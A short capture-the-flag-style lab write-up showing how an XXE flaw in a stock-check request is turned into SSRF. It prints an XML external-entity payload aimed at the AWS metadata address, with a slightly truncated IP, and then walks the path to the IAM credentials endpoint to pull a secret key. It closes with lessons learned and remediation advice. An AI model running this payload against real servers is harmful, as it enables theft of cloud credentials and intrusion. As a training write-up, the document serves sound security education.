# Lab: Exploiting XXE to Perform SSRF Attacks

---

##  How to Sovled

1. **Intercept the Request:**
   - Visited a product page and clicked **"Check stock"**.
   - Intercepted the `POST /product/stock` request using Burp Suite and sent it to **Repeater**.

2. **Inject the XXE Payload:**
   - Added an external entity pointing to the internal AWS metadata IP (`http://169.254.169`) and referenced `&xxe;` inside the `<productId>` tag:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169"> ]>
   <stockCheck>
       <productId>&xxe;</productId>
       <storeId>1</storeId>
   </stockCheck>
   ```

3. **Enumerate the Metadata Directories:**
   - The response returned `"Invalid product ID: latest"`, confirming the SSRF worked.
   - Iteratively appended each discovered directory name to the URL path:
     - `/latest`
     - `/latest/meta-data`
     - `/latest/meta-data/iam`
     - `/latest/meta-data/iam/security-credentials`
     - `/latest/meta-data/iam/security-credentials/admin`

4. **Retrieve the Secret Key:**
   - Sending the final payload returned the JSON response containing the `SecretAccessKey`, solving the lab.

---

## I Learned
- **Vulnerability Chaining:** An XXE flaw can be escalated into an SSRF attack to reach internal endpoints inaccessible from the outside internet.
- **Cloud Metadata Exposure:** Misconfigured XML parsers on cloud-hosted servers (like AWS EC2 using IMDSv1) can expose sensitive IAM credentials via `169.254.169.254`.
- **Remediation:** Disable external entities and Document Type Definitions (DTDs) completely in the application's XML parser configuration.
